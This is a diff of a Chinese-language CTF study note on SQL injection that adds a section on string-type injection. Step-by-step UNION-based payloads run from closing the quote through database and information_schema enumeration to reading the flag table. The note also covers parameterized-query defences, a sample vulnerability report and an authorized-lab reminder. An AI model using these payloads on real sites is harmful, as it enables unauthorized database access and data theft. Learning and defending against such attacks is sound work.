@@ -1,4 +1,4 @@
-# 03 · SQL 注入入门
+# 03 · SQL 注入入门(整数型+字符型)
 
 > 日期：2026-09-14 | 标签：#Web安全 #SQL注入
 
@@ -43,7 +43,30 @@
 | ⑥ 查字段名 | `-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'` | flag |
 | ⑦ 取数据 | `-1 union select 1,flag from flag` | 拿到 flag ✅ |
 
-## 5. information_schema 速查
+## 5.字符型注入（对比整数型）
+
+### 和整数型的区别
+
+| | 整数型 | 字符型 |
+|---|---|---|
+| 后台 SQL | `where id=1` | `where id='1'` |
+| 是否需要处理引号 | 不需要 | 需要闭合引号 |
+| payload 写法 | `1 order by 2` | `1' order by 2 #` |
+
+### 操作步骤
+
+| 步骤 | payload | 结果 |
+|---|---|---|
+| 判断注入类型 | `1'` | 报错 → 说明是字符型 |
+| 闭合引号 | `1' #` | 正常 |
+| 判断列数 | `1' order by 2 #` / `1' order by 3 #` | （填你的结果） |
+| 回显位 | `-1' union select 1,2 #` | （填结果） |
+| 查库名 | `-1' union select 1,database() #` | （填结果） |
+| 查表名 | `-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #` | （填结果） |
+| 查字段名 | `-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #` | （填结果） |
+| 取 flag | `-1' union select 1,flag from flag #` | （填结果） |
+
+## 6.information_schema
 
 | 想知道什么 | 查哪张目录表 | 看哪一列 |
 |---|---|---|
@@ -54,7 +77,7 @@
 
 说明：这些目录表由 MySQL 自动维护，记录所有库、表、字段的元信息。
 
-## 6.schema_name与 table_schema的区别
+## 7.schema_name与 table_schema的区别
  ① 想知道有哪些数据库（列出所有库名）
 ```
 select schema_name from information_schema.schemata
@@ -64,19 +87,19 @@ select schema_name from information_schema.schemata
 select table_name from information_schema.tables 
 where table_schema = 'sqli'
 ```
-## 7. 我的理解
+## 8. 我的理解
 
 1. `order by` 前面要带上合法的 id 值，否则 `id=order by 2` 会报错
 2. 用 `union select` 时前面写 `-1`，是为了让原查询查不到数据，我们自己的结果才能显示出来
 3. 最后一步的两个 `flag`：一个在 `from` 后面（表名），一个在 `select` 和 `from` 之间（字段名）
 4. `information_schema` 是 MySQL 自动维护的"总目录"，记录了所有库、表、字段的名字，不知道表名/字段名时就靠它查出来
 
-## 8. 踩坑记录
+## 9. 踩坑记录
 
 - 一开始只写 `order by 2` 会报错，因为输入会被拼到 `id=` 后面，必须带上合法值：`1 order by 2`
 - 单行数据看不出排序变化，判断列数要看**报不报错**，不是看内容变没变
 
-## 9. 防御方法
+## 10. 防御方法
 
 ### 根本方法：参数化查询（预编译）
 
@@ -102,7 +125,7 @@ cursor.execute("select * from news where id=%s", (用户输入,))
 - 错误信息不外泄：不把 SQL 报错直接显示给用户
 - WAF：拦截常见注入特征（可能被绕过，不能只靠它）
 
-## 10. 漏洞报告示例（练习写报告）
+## 11. 漏洞报告示例（练习写报告）
 
 | 项目 | 内容 |
 |---|---|
@@ -113,10 +136,10 @@ cursor.execute("select * from news where id=%s", (用户输入,))
 | 危害说明 | 攻击者可读取数据库中任意数据；真实场景下可能导致用户账号密码泄露 |
 | 修复建议 | 使用参数化查询；限制数据库账号权限；不向前端泄露 SQL 错误信息 |
 
-## 11. 合规提醒
+## 12. 合规提醒
 
 所有实验仅在本人环境或授权靶场（CTFHub）中完成。未经授权对真实网站进行测试属于违法行为。
 
-## 12. 参考资料
+## 13. 参考资料
 
 - PortSwigger Web Security Academy：https://portswigger.net/web-security
